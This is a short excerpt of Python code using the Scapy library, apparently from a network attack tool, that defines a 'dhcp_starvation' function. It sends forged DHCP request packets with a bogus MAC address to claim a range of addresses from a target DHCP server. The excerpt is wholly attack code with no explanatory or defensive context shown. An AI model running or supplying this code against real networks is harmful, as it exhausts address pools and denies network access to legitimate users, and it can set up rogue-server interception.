    ...
    def dhcp_starvation():
        for ip in range (100,120):
            for i in range (0,1):
                ...
                dhcp_request = Ether(src=bogus_mac_address, dst=layer2_broadcast)/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=bogus_mac_address)/DHCP(options=[("message-type","request"),("server_id",Server_ip),("requested_addr", IP_address_subnet + str(ip)),"end"])
                sendp(dhcp_request)
